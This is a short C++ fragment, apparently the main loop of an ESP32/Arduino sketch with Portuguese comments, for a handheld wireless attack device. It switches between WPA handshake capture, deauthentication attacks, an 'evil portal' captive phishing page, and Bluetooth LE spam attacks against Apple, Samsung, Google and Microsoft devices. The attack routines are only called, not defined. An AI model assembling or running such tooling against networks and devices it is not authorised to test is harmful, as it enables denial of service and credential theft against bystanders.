// ==================== LOOP ====================
void loop() {
    handleKeyboard();
    
    switch (currentMode) {
        case MODE_HANDSHAKE_CAPTURE:
            changeChannel();
            displayHandshakeCaptureCompact();
            break;
            
        case MODE_CLONE_DEAUTH:
            displayNetworkListCompact();
            performDeauthAttack();
            break;
            
        case MODE_EVIL_PORTAL:
            dnsServer.processNextRequest();
            server.handleClient();
            displayEvilPortalCompact();
            break;
            
        case MODE_BLUETOOTH:
            // Execute active BLE attack
            if (bleAttacks.isRunning()) {
                switch (bleAttacks.getCurrentAttack()) {
                    case BLE_ATTACK_SOUR_APPLE:
                        bleAttacks.executeSourApple();
                        break;
                    case BLE_ATTACK_SAMSUNG:
                        bleAttacks.executeSamsungSpam();
                        break;
                    case BLE_ATTACK_GOOGLE:
                        bleAttacks.executeGoogleSpam();
                        break;
                    case BLE_ATTACK_MICROSOFT:
                        bleAttacks.executeMicrosoftSpam();
                        break;
                    default:
                        break;
                }
            }
            displayBluetoothMenu();
            break;
            
        case MODE_MENU:
            // Menu já desenhado
            break;
    }
    
    delay(50);  // Menor delay para melhor responsividade do teclado
}
